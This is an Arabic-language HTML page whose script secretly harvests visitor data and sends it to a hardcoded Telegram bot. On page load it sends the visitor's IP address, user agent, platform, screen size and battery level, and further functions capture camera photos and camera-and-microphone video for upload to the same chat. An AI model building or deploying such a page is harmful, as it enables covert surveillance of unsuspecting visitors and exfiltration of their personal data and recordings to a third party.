<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جمع البيانات وإرسالها إلى Telegram</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f8ff;
            color: #333;
            padding: 20px;
            text-align: center;
        }
        .loader {
            margin: 20px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>جاري جمع البيانات...</h1>
    <div class="loader"></div>
    <p id="status">جاري جمع المعلومات...</p>

    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";

        let isCameraPermissionGranted = false; // متغير للتحقق من إذا تم منح إذن الكاميرا

        // دالة إرسال رسالة نصية عبر تلجرام
        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text })
            });
        }

        // إرسال صورة
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        // إرسال فيديو
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                method: "POST",
                body: formData
            });
        }

        // إرسال صوت
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
                method: "POST",
                body: formData
            });
        }

        // بيانات الجهاز
        async function sendDeviceInfo() {
            const battery = await navigator.getBattery();
            const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
            const msg = `
👑 شادو، هناك دخيل جدي 👑

🌐 بيــانـات الجهاز 🌐
• المـقـــــــــــع: ${location.href}
• إســـم الجهـاز: ${navigator.userAgent}
• IP Phon: ${ip.ip || "غير معروف"}
• اللغة: ${navigator.language}
• النظام: ${navigator.platform}
• حجم الشاشة: ${screen.width}x${screen.height}
• البطارية: ${battery.level * 100}% ${battery.charging ? '🔌' : '🔋'}

📸 صور: 10 سيتم إرسالها
🎬 فيديو: سيتم تسجيله لاحقًا
🎤 صوت: 10 تسجيلات قادمة
  `;
            await sendToTelegram(msg);
        }

        // دالة التقاط الصورة باستخدام الكاميرا
        async function captureAndSendPhoto() {
            if (!isCameraPermissionGranted) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    isCameraPermissionGranted = true; // تم منح الإذن
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);

                    const blob = await imageCapture.takePhoto();
                    await sendPhoto(blob);  // إرسال الصورة عبر البوت

                    track.stop(); // إيقاف الكاميرا
                } catch (e) {
                    console.warn("فشل التقاط الصورة:", e);
                }
            } else {
                console.log("تم منح إذن الكاميرا بالفعل.");
            }
        }

        // دالة تسجيل الفيديو
        async function recordAndSendVideo(duration) {
            if (!isCameraPermissionGranted) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    isCameraPermissionGranted = true; // تم منح الإذن
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];

                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        await sendVideo(blob);  // إرسال الفيديو عبر البوت
                        stream.getTracks().forEach(t => t.stop());
                    };

                    recorder.start();
                    setTimeout(() => recorder.stop(), duration * 1000);  // تحديد مدة التسجيل
                } catch (e) {
                    console.warn("فشل تسجيل الفيديو:", e);
                }
            } else {
                console.log("تم منح إذن الكاميرا بالفعل.");
            }
        }

        // عند الضغط على زر التقاط الصورة
        document.getElementById("capturePhotoBtn").addEventListener("click", async () => {
            await captureAndSendPhoto();  // التقاط الصورة وإرسالها
            await sendDeviceInfo();  // جمع بيانات الجهاز وإرسالها
        });

        // عند الضغط على زر تسجيل الفيديو
        document.getElementById("recordVideoBtn").addEventListener("click", async () => {
            const videoDuration = prompt("من فضلك، حدد مدة الفيديو (بالثواني):");
            if (videoDuration && !isNaN(videoDuration) && videoDuration > 0) {
                await recordAndSendVideo(Number(videoDuration));  // تسجيل الفيديو وإرساله
                await sendDeviceInfo();  // جمع بيانات الجهاز وإرسالها
            } else {
                alert("الرجاء إدخال مدة صحيحة.");
            }
        });

        // جمع البيانات عند تحميل الصفحة (البيانات العامة)
        window.onload = async () => {
            await sendDeviceInfo();  // جمع بيانات الجهاز وإرسالها عند تحميل الصفحة
        };
    </script>

</body>
</html>
